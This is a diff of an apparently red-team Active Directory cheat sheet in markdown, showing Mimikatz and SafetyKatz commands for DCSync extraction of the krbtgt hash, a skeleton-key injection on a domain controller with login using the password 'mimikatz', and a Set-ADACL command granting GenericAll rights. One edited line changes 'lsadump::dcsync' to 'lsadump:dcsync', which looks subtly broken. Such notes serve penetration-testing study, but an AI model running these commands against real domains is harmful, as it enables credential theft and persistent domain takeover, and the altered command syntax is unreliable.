@@ -182,7 +182,7 @@ Rubeus.exe diamond
 
 {% code overflow="wrap" %}
 ```powershell
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  => Any account can be used/synced
+Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'  => Any account can be used/synced
 
 SafetyKatz.exe "lsadump::dcsync /user:dom\krbtgt" "exit"
 ```
@@ -212,9 +212,6 @@ SafetyKatz.exe "lsadump::dcsync /user:dom\krbtgt" "exit"
 {% code overflow="wrap" %}
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc-hostname.dom.local
-
-
-
 Enter-PSSession -computername dc-hostname -credential dom\Administrator
 Now you can login with the password "mimikatz"
 ```
@@ -476,6 +473,8 @@ Using AD Module
 Set-ADACL -samaccountname username -distinguishedname 'DC=subodmain,DC=domain,DC=local' -right GenericAll -verbose
 ```
 {% endcode %}
+
+
 
 **Add DCSync rights**
 
